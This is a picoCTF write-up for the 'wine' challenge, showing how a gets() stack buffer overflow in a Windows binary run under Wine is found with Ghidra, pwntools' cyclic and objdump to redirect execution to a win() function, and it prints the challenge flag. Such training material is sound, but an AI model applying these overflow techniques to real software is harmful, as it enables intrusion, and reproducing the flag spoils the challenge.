# wine

Author: David

## Description

Challenge best paired with wine.
I love windows. Checkout my exe running on a linux box. You can view source here. And connect with it using [host, port]

## Solution

"Wine" in the challenge title and description refers to the `wine` application that can be installed on Linux. This allows EXE files to run on Linux systems, even though those files were meant for Windows.
Run the program with `wine`.
```
$ wine vuln.exe 
Give me a string!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```
Create a project in Ghidra and examine the `main()` function. Eventually, `main()` calls `vuln()`, and the code for that function looks like this:
```
void _vuln(void)

{
  char local_8c [136];
  
  _puts("Give me a string!");
  _gets(local_8c);
  return;
}
```
This allocates 136 characters for a variable called `local_8c`, which the program receives from us through the (very insecure) `gets()` function. This is the basis of the exploit. 
A simple buffer overflow challenges like this one requires only a few pieces of information:
    1. How many padding characters do we need to full the buffer?
    2. Where to we need to jump, or what to we need to overwrite?
    3. How is the exploit put together?

### Determining the number of characters...
This can be done with `cyclic`. (From `pwntools`; can be accessed directly from the command line.)
Create a cyclic string of 200 characters with `cyclic 200`, and then pipe that string into the program as input. When the program crashes, close wine's GUI debugger, and view the error information in the terminal. Here's the beginning of that output:
```
$ echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab" | wine ./vuln.exe 
Give me a string!
wine: Unhandled page fault on read access to 6261616B at address 6261616B (thread 0009), starting debugger...
Unhandled exception: page fault on read access to 0x6261616b in 32-bit code (0x6261616b).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:6261616b ESP:0064fe20 EBP:6261616a EFLAGS:00010246(  R- --  I  Z- -P- )
 EAX:0064fd90 EBX:00230f14 ECX:0064fd80 EDX:7fa358b8
 ESI:00000040 EDI:00111874
Stack dump:
0x0064fe20:  6261616c 6261616d 6261616e 6261616f
0x0064fe30:  62616170 62616171 62616172 62616173
0x0064fe40:  62616174 62616175 62616176 62616177
0x0064fe50:  62616178 62616179 00230f00 00111874
0x0064fe60:  0064fe98 00000000 00000000 00000000
0x0064fe70:  00000000 00000000 00000000 00000000
```

Notice - "read access at "6261616B..." - those represent characters from our cyclic string, represented in hex. Luckily, `cyclic -l 0x6261616B` will tell us that this represents 140 characters. But what do we write?

### Writing to the win function
In CTF binary exploitation challenges, the goal of the exploit might be to redirect the program to the a "win" or "printflag" function. In this case it's a `win()` function.
`objdump -d vuln.exe` shows us the dissassembler output so we can find the address of the function. Below, I've edited the command for brevity in the output:
```
$ objdump -d vuln.exe | grep _win
00401530 <_win>:
  401551:	75 18                	jne    40156b <_win+0x3b>
  ```

0x0401530 is the address we need to write in order to move to the `win()` function.

### Notes on building the exploit 
* The address we include in our exploit needs to be packed in a specific way for the program to interpret it correctly. There are issues in doing this easily in Python3, so the script below works in Python2, and all imports are built-in.
* Wine apparently takes quite a while to load over the server. I've noticed it's anywhere from 1 to 15 seconds, so I've set the program to wait 15 seconds before trying to send or receive anything.
* Once sent, the our script will collect the flag and print it to our screen, and the connection between our machine and the server will be closed.

[wine_exploit.py](scripts/wine_exploit.py)

**Flag: picoCTF{Un_v3rr3_d3_v1n_1b40efad}**
